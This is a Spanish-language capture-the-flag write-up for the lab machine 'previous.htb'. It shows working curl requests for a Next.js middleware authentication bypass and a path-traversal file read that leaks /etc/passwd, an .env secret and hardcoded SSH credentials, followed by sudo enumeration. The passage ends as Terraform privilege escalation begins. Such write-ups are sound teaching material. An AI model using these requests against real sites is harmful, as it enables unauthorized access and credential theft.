### 1. Enumeración inicial

Comenzamos la máquina enumerando los puertos abiertos de la misma:

```bash
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.83 -oG allPorts
[sudo] contraseña para abra: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-09 12:47 +0000
Initiating SYN Stealth Scan at 12:47
Scanning 10.10.11.83 [65535 ports]
Discovered open port 80/tcp on 10.10.11.83
Discovered open port 22/tcp on 10.10.11.83
Completed SYN Stealth Scan at 12:47, 15.00s elapsed (65535 total ports)
Nmap scan report for 10.10.11.83
Host is up, received user-set (0.070s latency).
Scanned at 2026-01-09 12:47:35 WET for 15s
Not shown: 57650 closed tcp ports (reset), 7883 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.07 seconds
           Raw packets sent: 74623 (3.283MB) | Rcvd: 58284 (2.331MB)
```

Tiene un servidor web activo y el SSH. Añadimos `previous.htb` al /etc/hosts y empezamos a enumerar el sitio web.

---
### 2. Enumeración web

De primeras solo tenemos dos botones con redirección visibles en la página que pueden estar interesantes:

![[1]](img/1.png)

Ambos llevan a un panel de inicio de sesión, en principio no podemos auto registrarnos en el aplicativo. Si hacemos fuzzing a la web nos encontramos diversas rutas, pero todas protegidas mediante el panel de autenticación.

```bash
ffuf -w /home/abra/Documentos/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://previous.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/FUZZ
 :: Wordlist         : FUZZ: /home/abra/Documentos/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

docs                    [Status: 307, Size: 36, Words: 1, Lines: 1, Duration: 109ms]
api                     [Status: 307, Size: 35, Words: 1, Lines: 1, Duration: 79ms]
signin                  [Status: 200, Size: 3481, Words: 179, Lines: 1, Duration: 158ms]
docsis                  [Status: 307, Size: 38, Words: 1, Lines: 1, Duration: 95ms]
apis                    [Status: 307, Size: 36, Words: 1, Lines: 1, Duration: 171ms]
```

Si vemos el wappalizer nos identifica entre las tecnologías usadas del sitio web un **NextJS 15.2.2**.

![[2]](img/2.png)

---
### 3. Bypass de autenticación en NextJS

Esta versión tiene un **Authorization Bypass**: https://www.offsec.com/blog/cve-2025-29927/

Bien, para explotar la vulnerabilidad es tan simple como tratar de acceder a un recurso protegido por un login, como **/docs**, añadiendo la cabecera `x-middleware-subrequest: middleware` en la request:

```bash
curl -X GET 'http://previous.htb/docs' -H 'x-middleware-subrequest: middleware'
/api/auth/signin?callbackUrl=%2Fdocs%      
```

Todavía no la vulneramos, me dio una redirección igualmente al panel de login. Vamos a probar a concatenar varias veces el header:

```bash
❯ curl -X GET 'http://previous.htb/docs' -H 'x-middleware-subrequest: src/middleware'
/api/auth/signin?callbackUrl=%2Fdocs%                                                                                                                                      ❯ curl -X GET 'http://previous.htb/docs' -H 'x-middleware-subrequest: src/middleware:middleware'
/api/auth/signin?callbackUrl=%2Fdocs%                                                                                                                                      ❯ curl -X GET 'http://previous.htb/docs' -H 'x-middleware-subrequest: src/middleware:middleware:middleware'
/api/auth/signin?callbackUrl=%2Fdocs%                                                                                                                                      ❯ curl -X GET 'http://previous.htb/docs' -H 'x-middleware-subrequest: src/middleware:middleware:middleware:middleware'
/api/auth/signin?callbackUrl=%2Fdocs%                                                                                                                                      ❯ curl -X GET 'http://previous.htb/docs' -H 'x-middleware-subrequest: src/middleware:middleware:middleware:middleware:middleware'
/api/auth/signin?callbackUrl=%2Fdocs%                                                                                                                                      ❯ curl -X GET 'http://previous.htb/docs' -H 'x-middleware-subrequest: src/middleware:middleware:middleware:middleware:middleware:middleware'

<!DOCTYPE html><html><head><meta charSet="utf-8" data-next-head=""/><meta name="viewport" content="width=device-width" data-next-head=""/><title data-next-head="">PreviousJS Docs</title><link rel="preload" href="/_next/static/css/9a1ff1f4870b5a50.css" as="style"/><link rel="stylesheet" href="/_next/static/css/9a1ff1f4870b5a50.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-cb370083d4f9953f.js" defer=""></script><script src="/_next/static/chunks/framework-ee17a4c43a44d3e2.js" defer=""></script><script src="/_next/static/chunks/main-0221d9991a31a63c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-95f33af851b6322a.js" defer=""></script><script src="/_next/static/chunks/8-fd0c493a642e766e.js" defer=""></script><script src="/_next/static/chunks/0-c54fcec2d27b858d.js" defer=""></script><script src="/_next/static/chunks/pages/docs-5f6acb8b3a59fb7f.js" defer=""></script><script src="/_next/static/-ipsiOtEey-zESpHzrwmc/_buildManifest.js" defer=""></script><script src="/_next/static/-ipsiOtEey-zESpHzrwmc/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="flex min-h-screen bg-white"><div class="sticky top-0 h-screen w-64 border-r bg-gray-50 p-6"><h2 class="mb-6 text-lg font-semibold">PreviousJS</h2><nav><ul class="space-y-2"><li><a class="block rounded px-3 py-2 text-sm transition-colors text-gray-600 hover:bg-gray-100" href="/docs/getting-started">Getting Started</a></li><li><a class="block rounded px-3 py-2 text-sm transition-colors text-gray-600 hover:bg-gray-100" href="/docs/examples">Examples</a></li></ul></nav></div><main class="flex-1 p-8 lg:px-12 lg:py-10"><article class="prose prose-slate max-w-none"><h1>Documentation Overview</h1><p class="lead">Welcome to the documentation for PreviousJS. Get started with our comprehensive guides and API references.</p><div class="not-prose mt-8 grid gap-4 sm:grid-cols-2"><div class="rounded-lg border p-6"><h3 class="mb-2 text-lg font-semibold">Getting Started</h3><p class="mb-4 text-gray-600">New to PreviousJS? Begin here with basic setup and fundamental concepts.</p><a href="/docs/getting-started" class="text-blue-600 hover:underline">Start learning →</a></div><div class="rounded-lg border p-6"><h3 class="mb-2 text-lg font-semibold">Examples</h3><p class="mb-4 text-gray-600">Detailed examples.</p><a href="/docs/api-reference" class="text-blue-600 hover:underline">Explore examples →</a></div></div><div class="mt-8 border-t pt-8"><h2>Latest Updates</h2><ul class="text-sm text-gray-600"><li class="mt-2">v1.2.0 - Feat: middleware is now opt-out!</li><li class="mt-2">v1.1.4 - Improved TypeScript support</li><li class="mt-2">v1.1.0 - Performance optimizations</li></ul></div></article></main><div class="fixed top-0 right-0 p-4 bg-gray-100 border-t border-gray-200 shadow-md"><p class="text-sm text-gray-600">Logged in as <b>???</b></p><a href="#" class="cursor-pointer text-sm text-blue-600 hover:text-blue-800 underline">Sign out</a></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/docs","query":{},"buildId":"-ipsiOtEey-zESpHzrwmc","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}</script></body></html>%  
```

Funcionó. El middleware es el código de Next.js que se ejecuta antes de servir una página, en este caso para comprobar si estás logueado). **Funcionó concatenar el header muchas veces porque Next.js confía en x-middleware-subrequest para creer que ese middleware ya se ejecutó internamente**. Al repetirlo suficientes veces, el framework de Next.js asume que la request ya pasó por el middleware y lo salta, evitando la autenticación.

---
### 4. Enumeración de rutas internas

En el bloque html nos interesan las referencias a otros recursos de la web:

```html
<a href="/docs/getting-started">
<a href="/docs/examples">
<a href="/docs/api-reference">
```

Con la vulnerabilidad que explotamos podemos acceder a cualquier recurso de forma no autenticada siempre y cuando añadamos la cabecera a la petición.

Vamos a ver el contenido de **/examples**:

```bash
curl -X GET 'http://previous.htb/docs/examples' -H 'x-middleware-subrequest: src/middleware:middleware:middleware:middleware:middleware:middleware'

<!DOCTYPE html><html><head><meta charSet="utf-8" data-next-head=""/><meta name="viewport" content="width=device-width" data-next-head=""/><link rel="preload" href="/_next/static/css/9a1ff1f4870b5a50.css" as="style"/><link rel="stylesheet" href="/_next/static/css/9a1ff1f4870b5a50.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-cb370083d4f9953f.js" defer=""></script><script src="/_next/static/chunks/framework-ee17a4c43a44d3e2.js" defer=""></script><script src="/_next/static/chunks/main-0221d9991a31a63c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-95f33af851b6322a.js" defer=""></script><script src="/_next/static/chunks/8-fd0c493a642e766e.js" defer=""></script><script src="/_next/static/chunks/0-c54fcec2d27b858d.js" defer=""></script><script src="/_next/static/chunks/pages/docs/%5Bsection%5D-31d8b831c1e60f26.js" defer=""></script><script src="/_next/static/-ipsiOtEey-zESpHzrwmc/_buildManifest.js" defer=""></script><script src="/_next/static/-ipsiOtEey-zESpHzrwmc/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div>Error</div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/docs/[section]","query":{},"buildId":"-ipsiOtEey-zESpHzrwmc","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}</script></body></html>%    
```

Me da error. Me interesa esto de la respuesta igualmente:

```html
<script src="/_next/static/chunks/pages/docs/%5Bsection%5D-31d8b831c1e60f26.js" defer=""></script>
```

Este archivo de Next.js define las rutas dinámicas válidas para el servidor, por lo que vamos a descargarlo en nuestra máquina:

```bash
curl http://previous.htb/_next/static/chunks/pages/docs/%5Bsection%5D-31d8b831c1e60f26.js -o section.js

% Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   6836 100   6836   0      0  38677      0  
```

Lo leemos:

```bash
cat section.js
(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[477],{162:(e,t,r)=>{"use strict";r.r(t),r.d(t,{default:()=>d});var l=r(7876),a=r(9470),s=r(8847),n=r.n(s),o=r(9099),i=r(7328),u=r.n(i);function d(){var e;let t=(0,o.useRouter)().query.section;if(!t)return(0,l.jsx)("div",{children:"Error"});let s=(e=t,n()(()=>r(9853)("./".concat(e,".mdx"))));return(0,l.jsxs)(a.default,{children:[(0,l.jsx)(u(),{children:(0,l.jsx)("title",{children:"PreviousJS Docs"})}),(0,l.jsx)("article",{className:"prose prose-slate max-w-none",children:(0,l.jsx)(s,{})})]})}},1147:(e,t,r)=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0}),!function(e,t){for(var r in t)Object.defineProperty(e,r,{enumerable:!0,get:t[r]})}(t,{default:function(){return o},noSSR:function(){return n}});let l=r(4252);r(7876),r(4232);let a=l._(r(2100));function s(e){return{default:(null==e?void 0:e.default)||e}}function n(e,t){return delete t.webpack,delete t.modules,e(t)}function o(e,t){let r=a.default,l={loading:e=>{let{error:t,isLoading:r,pastDelay:l}=e;return null}};e instanceof Promise?l.loader=()=>e:"function"==typeof e?l.loader=e:"object"==typeof e&&(l={...l,...e});let o=(l={...l,...t}).loader;return(l.loadableGenerated&&(l={...l,...l.loadableGenerated},delete l.loadableGenerated),"boolean"!=typeof l.ssr||l.ssr)?r({...l,loader:()=>null!=o?o().then(s):Promise.resolve(s(()=>null))}):(delete l.webpack,delete l.modules,n(r,l))}("function"==typeof t.default||"object"==typeof t.default&&null!==t.default)&&void 0===t.default.__esModule&&(Object.defineProperty(t.default,"__esModule",{value:!0}),Object.assign(t.default,t),e.exports=t.default)},1310:(e,t,r)=>{(window.__NEXT_P=window.__NEXT_P||[]).push(["/docs/[section]",function(){return r(162)}])},1435:(e,t,r)=>{"use strict";r.r(t),r.d(t,{default:()=>i});var l=r(7876),a=r(8230),s=r.n(a),n=r(9099);let o=[{title:"Getting Started",path:"getting-started"},{title:"Examples",path:"examples"}];function i(){let e=(0,n.useRouter)();return(0,l.jsxs)("div",{className:"sticky top-0 h-screen w-64 border-r bg-gray-50 p-6",children:[(0,l.jsx)("h2",{className:"mb-6 text-lg font-semibold",children:"PreviousJS"}),(0,l.jsx)("nav",{children:(0,l.jsx)("ul",{className:"space-y-2",children:o.map(t=>(0,l.jsx)("li",{children:(0,l.jsx)(s(),{href:"/docs/".concat(t.path),className:"block rounded px-3 py-2 text-sm transition-colors ".concat(e.asPath==="/docs/".concat(t.path)?"bg-blue-100 text-blue-700":"text-gray-600 hover:bg-gray-100"),children:t.title})},t.path))})})]})}},1650:(e,t,r)=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0}),Object.defineProperty(t,"LoadableContext",{enumerable:!0,get:function(){return l}});let l=r(4252)._(r(4232)).default.createContext(null)},2100:(e,t,r)=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0}),Object.defineProperty(t,"default",{enumerable:!0,get:function(){return h}});let l=r(4252)._(r(4232)),a=r(1650),s=[],n=[],o=!1;function i(e){let t=e(),r={loading:!0,loaded:null,error:null};return r.promise=t.then(e=>(r.loading=!1,r.loaded=e,e)).catch(e=>{throw r.loading=!1,r.error=e,e}),r}class u{promise(){return this._res.promise}retry(){this._clearTimeouts(),this._res=this._loadFn(this._opts.loader),this._state={pastDelay:!1,timedOut:!1};let{_res:e,_opts:t}=this;e.loading&&("number"==typeof t.delay&&(0===t.delay?this._state.pastDelay=!0:this._delay=setTimeout(()=>{this._update({pastDelay:!0})},t.delay)),"number"==typeof t.timeout&&(this._timeout=setTimeout(()=>{this._update({timedOut:!0})},t.timeout))),this._res.promise.then(()=>{this._update({}),this._clearTimeouts()}).catch(e=>{this._update({}),this._clearTimeouts()}),this._update({})}_update(e){this._state={...this._state,error:this._res.error,loaded:this._res.loaded,loading:this._res.loading,...e},this._callbacks.forEach(e=>e())}_clearTimeouts(){clearTimeout(this._delay),clearTimeout(this._timeout)}getCurrentValue(){return this._state}subscribe(e){return this._callbacks.add(e),()=>{this._callbacks.delete(e)}}constructor(e,t){this._loadFn=e,this._opts=t,this._callbacks=new Set,this._delay=null,this._timeout=null,this.retry()}}function d(e){return function(e,t){let r=Object.assign({loader:null,loading:null,delay:200,timeout:null,webpack:null,modules:null},t),s=null;function i(){if(!s){let t=new u(e,r);s={getCurrentValue:t.getCurrentValue.bind(t),subscribe:t.subscribe.bind(t),retry:t.retry.bind(t),promise:t.promise.bind(t)}}return s.promise()}if(!o){let e=r.webpack?r.webpack():r.modules;e&&n.push(t=>{for(let r of e)if(t.includes(r))return i()})}function d(e,t){!function(){i();let e=l.default.useContext(a.LoadableContext);e&&Array.isArray(r.modules)&&r.modules.forEach(t=>{e(t)})}();let n=l.default.useSyncExternalStore(s.subscribe,s.getCurrentValue,s.getCurrentValue);return l.default.useImperativeHandle(t,()=>({retry:s.retry}),[]),l.default.useMemo(()=>{var t;return n.loading||n.error?l.default.createElement(r.loading,{isLoading:n.loading,pastDelay:n.pastDelay,timedOut:n.timedOut,error:n.error,retry:s.retry}):n.loaded?l.default.createElement((t=n.loaded)&&t.default?t.default:t,e):null},[e,n])}return d.preload=()=>i(),d.displayName="LoadableComponent",l.default.forwardRef(d)}(i,e)}function c(e,t){let r=[];for(;e.length;){let l=e.pop();r.push(l(t))}return Promise.all(r).then(()=>{if(e.length)return c(e,t)})}d.preloadAll=()=>new Promise((e,t)=>{c(s).then(e,t)}),d.preloadReady=e=>(void 0===e&&(e=[]),new Promise(t=>{let r=()=>(o=!0,t());c(n,e).then(r,r)})),window.__NEXT_PRELOADREADY=d.preloadReady;let h=d},7328:(e,t,r)=>{e.exports=r(9836)},8847:(e,t,r)=>{e.exports=r(1147)},9470:(e,t,r)=>{"use strict";r.r(t),r.d(t,{default:()=>i});var l=r(7876),a=r(4232),s=r(1435),n=r(4e3),o=r(2934);function i(e){var t;let{children:r}=e,i=(0,n.useRouter)(),u=(0,a.useCallback)(async()=>{await (0,o.signOut)({redirect:!1}),i.refresh()},[i]),d=null===(t=(0,o.useSession)().data)||void 0===t?void 0:t.user,c=(null==d?void 0:d.name)||"???";return(0,l.jsxs)("div",{className:"flex min-h-screen bg-white",children:[(0,l.jsx)(s.default,{}),(0,l.jsx)("main",{className:"flex-1 p-8 lg:px-12 lg:py-10",children:r}),(0,l.jsxs)("div",{className:"fixed top-0 right-0 p-4 bg-gray-100 border-t border-gray-200 shadow-md",children:[(0,l.jsxs)("p",{className:"text-sm text-gray-600",children:["Logged in as ",(0,l.jsx)("b",{children:c})]}),(0,l.jsx)("a",{href:"#",onClick:u,className:"cursor-pointer text-sm text-blue-600 hover:text-blue-800 underline",children:"Sign out"})]})]})}},9853:(e,t,r)=>{var l={"./examples.mdx":[2183,183],"./getting-started.mdx":[1894,894]};function a(e){if(!r.o(l,e))return Promise.resolve().then(()=>{var t=Error("Cannot find module '"+e+"'");throw t.code="MODULE_NOT_FOUND",t});var t=l[e],a=t[0];return r.e(t[1]).then(()=>r(a))}a.keys=()=>Object.keys(l),a.id=9853,e.exports=a}},e=>{var t=t=>e(e.s=t);e.O(0,[8,0,636,593,792],()=>t(1310)),_N_E=e.O()}]);% 
```

---
### 5. Acceso mediante navegador y proxy web

Bien, según el archivo en el servidor existe tanto `/docs/getting-started` como `/docs/examples`, nos da error **porque curl no interpreta el código javascript necesario para que cargue la página**. Bien, vamos a interceptar entonces con Caido o BurpSuite la petición a `http://previous.htb/docs/examples` y añadirle la cabecera `x-middleware-subrequest: src/middleware:middleware:middleware:middleware:middleware:middleware`:

![[3]](img/3.png)

Le damos **Forward, y dejamos que pasen el resto de las peticiones**, veremos como ahora carga correctamente la página:

![[4]](img/4.png)

---
### 6. Local File Inclusion en la API

De acá lo interesante es que hay una referencia a una API **/api/download** con un parámetro **example** que apunta a un archivo del servidor.

![[5]](img/5.png)

Haciendo un par de pruebas, descubro que tiene un **Local File Inclusion** el parámetro:

```bash
curl -X GET 'http://previous.htb/api/download?example=../../../../../../../etc/passwd' -H 'x-middleware-subrequest: src/middleware:middleware:middleware:middleware:middleware:middleware'
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

---
### 7. Enumeración interna de NextJS

Ya que la aplicación usa node.js y next.js, vamos a tratar de dar con algún archivo .env o de configuración importante para leerlo:

```bash
curl -X GET 'http://previous.htb/api/download?example=../../.env' -H 'x-middleware-subrequest: src/middleware:middleware:middleware:middleware:middleware:middleware'

NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```

Tenemos la clave criptográfica de NextAuth con la que se firman cookies de sesión, vamos a seguir enumerando archivos:

En las aplicaciones de NextJS suele haber un archivo en el directorio **/app/.next** con diversas rutas y archivos locales dentro del directorio mencionado de que podrían estar interesantes, veamos si podemos leer **routes-manifest.json**:

```json
❯ curl -X GET 'http://previous.htb/api/download?example=../../.next/routes-manifest.json' -H 'x-middleware-subrequest: src/middleware:middleware:middleware:middleware:middleware:middleware'
{
  "version": 3,
  "pages404": true,
  "caseSensitive": false,
  "basePath": "",
  "redirects": [
    {
      "source": "/:path+/",
      "destination": "/:path+",
      "internal": true,
      "statusCode": 308,
      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"
    }
  ],
  "headers": [],
  "dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      },
      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
    },
    {
      "page": "/docs/[section]",
      "regex": "^/docs/([^/]+?)(?:/)?$",
      "routeKeys": {
        "nxtPsection": "nxtPsection"
      },
      "namedRegex": "^/docs/(?<nxtPsection>[^/]+?)(?:/)?$"
    }
  ],
  "staticRoutes": [
    {
      "page": "/",
      "regex": "^/(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/(?:/)?$"
    },
    {
      "page": "/docs",
      "regex": "^/docs(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs(?:/)?$"
    },
    {
      "page": "/docs/components/layout",
      "regex": "^/docs/components/layout(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/layout(?:/)?$"
    },
    {
      "page": "/docs/components/sidebar",
      "regex": "^/docs/components/sidebar(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/sidebar(?:/)?$"
    },
    {
      "page": "/docs/content/examples",
      "regex": "^/docs/content/examples(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/examples(?:/)?$"
    },
    {
      "page": "/docs/content/getting-started",
      "regex": "^/docs/content/getting\\-started(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/getting\\-started(?:/)?$"
    },
    {
      "page": "/signin",
      "regex": "^/signin(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/signin(?:/)?$"
    }
  ],
  "dataRoutes": [],
  "rsc": {
    "header": "RSC",
    "varyHeader": "RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch",
    "prefetchHeader": "Next-Router-Prefetch",
    "didPostponeHeader": "x-nextjs-postponed",
    "contentTypeHeader": "text/x-component",
    "suffix": ".rsc",
    "prefetchSuffix": ".prefetch.rsc",
    "prefetchSegmentHeader": "Next-Router-Segment-Prefetch",
    "prefetchSegmentSuffix": ".segment.rsc",
    "prefetchSegmentDirSuffix": ".segments"
  },
  "rewriteHeaders": {
    "pathHeader": "x-nextjs-rewritten-path",
    "queryHeader": "x-nextjs-rewritten-query"
  },
  "rewrites": []
}%
```

De acá nos interesa:

```json
 {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      }
```

---
### 8. Obtención de credenciales y acceso SSH

Esto de `/api/auth/[...nextauth]` **es un archivo javascript que se encuentra en `.next/server/pages/api/auth/[...nextauth].js`**. Vamos a tratar de leerlo a ver si contiene información relevante, ya que parece manejar la autenticación del sitio web por el nombre de la ruta:

```javascript
curl -X GET "http://previous.htb/api/download?example=../../.next/server/pages/api/auth/\[...nextauth\].js" -H 'x-middleware-subrequest: src/middleware:middleware:middleware:middleware:middleware:middleware'
"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();%
```

Tenemos las credenciales `jeremy:MyNameIsJeremyAndILovePancakes`, vamos a tratar de meternos a la máquina mediante el SSH que tiene abierto:

```shell
ssh jeremy@10.10.11.83
The authenticity of host '10.10.11.83 (10.10.11.83)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.83' (ED25519) to the list of known hosts.
jeremy@10.10.11.83's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jan  9 04:47:46 PM UTC 2026

  System load:  0.0               Processes:             217
  Usage of /:   77.7% of 8.76GB   Users logged in:       0
  Memory usage: 8%                IPv4 address for eth0: 10.10.11.83
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Jan 9 16:47:48 2026 from 10.10.15.254
jeremy@previous:~$ ls
docker  user.txt
```

Tenemos la user flag. Toca ir a por la root flag.

---
### 9. Enumeración local como jeremy

De primeras en el home de **jeremy** nos encontramos un directorio docker, veamos que contiene:

```shell
jeremy@previous:~/docker$ ls -l
total 8
-rw-r--r-- 1 jeremy jeremy  107 Sep 22 07:37 docker-compose.yml
drwxr-xr-x 7 jeremy jeremy 4096 Aug 21 20:09 previous
jeremy@previous:~/docker$ ls -l previous
total 172
-rw-r--r-- 1 jeremy jeremy    154 Apr 12  2025 app.json
drwxr-xr-x 2 jeremy jeremy   4096 Aug 21 20:09 components
-rw-r--r-- 1 jeremy jeremy   2174 Apr 12  2025 Dockerfile
drwxr-xr-x 2 jeremy jeremy   4096 Aug 21 20:09 lib
-rw-r--r-- 1 jeremy jeremy    109 Apr 12  2025 middleware.ts
-rw-r--r-- 1 jeremy jeremy    288 Apr 12  2025 next.config.mjs
-rw-r--r-- 1 jeremy jeremy    587 Apr 12  2025 package.json
-rw-r--r-- 1 jeremy jeremy 125651 Apr 12  2025 package-lock.json
drwxr-xr-x 4 jeremy jeremy   4096 Aug 21 20:09 pages
-rw-r--r-- 1 jeremy jeremy    101 Apr 12  2025 postcss.config.mjs
drwxr-xr-x 3 jeremy jeremy   4096 Aug 21 20:09 public
drwxr-xr-x 2 jeremy jeremy   4096 Aug 21 20:09 styles
-rw-r--r-- 1 jeremy jeremy    651 Apr 12  2025 tsconfig.json
```

El `docker-compose.yml` y el `Dockerfile` son los archivos más interesantes pero no parece que vaya a tirar por acá la máquina, el usuario no tiene permisos de Docker. 

Enumerando nos encontramos que el usuario **jeremy puede ejecutar `/usr/bin/terraform -chdir=/opt/examples apply` con sudo como root**

```shell
jeremy@previous:~/docker$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

---
### 10. Escalada de privilegios mediante Terraform

Con el binario de terraform podemos crear archivos, cambiar permisos, ejecutar comandos, entre un montón de cosas a partir de un archivo `.tf` que definamos. Con sudo podemos solo ejecutar la orden **apply** en **/opt/examples** (aparentemente, **ahora veremos que no es completamente así**) como hemos visto con `sudo -l`.

Veamos los permisos que tenemos en el directorio y en los archivos que tiene dentro:

```shell
jeremy@previous:~$ ls -la /opt/
total 20
drwxr-xr-x  5 root root 4096 Aug 21 20:09 .
drwxr-xr-x 18 root root 4096 Aug 21 20:23 ..
drwx--x--x  4 root root 4096 Aug 21 20:09 containerd
drwxr-xr-x  3 root root 4096 Jan  9 17:14 examples
drwxr-xr-x  3 root root 4096 Aug 21 20:09 terraform-provider-examples
jeremy@previous:~$ ls -la /opt/examples
total 28
drwxr-xr-x 3 root root 4096 Jan  9 17:14 .
drwxr-xr-x 5 root root 4096 Aug 21 20:09 ..
-rw-r--r-- 1 root root   18 Apr 12  2025 .gitignore
-rw-r--r-- 1 root root  576 Aug 21 18:15 main.tf
